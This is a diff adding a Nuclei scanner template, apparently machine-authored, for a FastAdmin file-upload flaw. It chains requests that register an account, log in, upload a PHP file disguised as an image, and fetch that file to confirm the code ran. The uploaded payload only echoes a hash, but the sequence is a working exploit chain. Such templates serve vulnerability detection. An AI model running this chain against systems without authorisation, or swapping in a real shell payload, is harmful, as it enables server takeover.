@@ -1,0 +1,133 @@
+id: fastadmin-file-upload-vulnerability
+
+info:
+  name: FastAdmin File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    There is a file upload vulnerability in FastAdmin's ajax/upload method before the v1.0.0.20180417 version, caused by a logical error in suffix validation. An attacker may exploit this to execute arbitrary code and gain control over the web server.
+  tags: file-upload
+  reference:
+    - https://github.com/karsonzhang/fastadmin/releases/tag/v1.0.0.20180406_beta
+
+variables:
+  initial_cookie: "PHPSESSID=rvitsn3e1lbbcab8h5gccalah8"
+
+flow: |
+  http(1) && http(2) && http(3) && http(4) && http(5)
+
+http:
+  - id: register-user
+    method: POST
+    path:
+      - "{{BaseURL}}/index.php/api/user/register"
+    headers:
+      Cookie: "{{initial_cookie}}"
+      Content-Type: application/x-www-form-urlencoded
+    body: "username=fastadmin_2018&password=admin@123&email=&mobile="
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '{"code":1,"msg":"注册成功'
+          - '{"code":0,"msg":"用户名已经存'
+
+  - id: fetch-login-token
+    method: GET
+    path:
+      - "{{BaseURL}}/index.php/index/user/login"
+    headers:
+      Cookie: "{{initial_cookie}}"
+    extractors:
+      - type: regex
+        name: token
+        part: body
+        group: 1
+        regex:
+          - "__token__ value=\"(.*?)\""
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "__token__"
+
+  - id: login-user
+    method: POST
+    path:
+      - "{{BaseURL}}/index.php/index/user/login"
+    headers:
+      Cookie: "{{initial_cookie}}"
+      Content-Type: application/x-www-form-urlencoded
+    body: "__token__={{token}}&account=fastadmin_2018&password=admin%40123&keeplogin=1"
+    extractors:
+      - type: regex
+        name: logtoken
+        part: header
+        group: 1
+        regex:
+          - "token=(.*?);"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "Set-Cookie: token="
+
+  - id: upload-php-file
+    method: POST
+    path:
+      - "{{BaseURL}}/index.php/index/ajax/upload"
+    headers:
+      Cookie: "{{initial_cookie}}; token={{logtoken}}"
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypT3Bbj7EGhdhhZH0
+    body: |
+      ------WebKitFormBoundarypT3Bbj7EGhdhhZH0
+      Content-Disposition: form-data; name="file"; filename="a.php"
+      Content-Type: png
+
+      <?php echo md5(123);?>
+      ------WebKitFormBoundarypT3Bbj7EGhdhhZH0--
+    extractors:
+      - type: regex
+        name: date
+        part: body
+        group: 1
+        regex:
+          - "/([\\d]{1,8})\\"
+      - type: regex
+        name: filename
+        part: body
+        group: 1
+        regex:
+          - "/([\\w]{1,32})\\.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '{"code":1,"msg":"上传成功'
+
+  - id: verify-php-evaluation
+    method: GET
+    path:
+      - "{{BaseURL}}/uploads/{{date}}/{{filename}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "202cb962ac59075b964b07152d234b70"
